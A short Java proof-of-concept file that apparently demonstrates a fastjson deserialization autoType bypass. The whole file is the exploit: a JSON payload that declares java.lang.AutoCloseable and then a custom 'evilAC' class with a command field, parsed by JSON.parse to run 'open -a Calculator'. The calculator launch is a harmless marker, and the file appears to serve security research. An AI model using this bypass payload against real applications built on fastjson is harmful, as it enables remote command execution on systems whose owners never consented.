package com.json;

import com.alibaba.fastjson.JSON;

public class AutoCloseableBypass {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.json.evilAC\",\"cmd\":\"open -a Calculator\"}";
        JSON.parse(payload);
    }
}
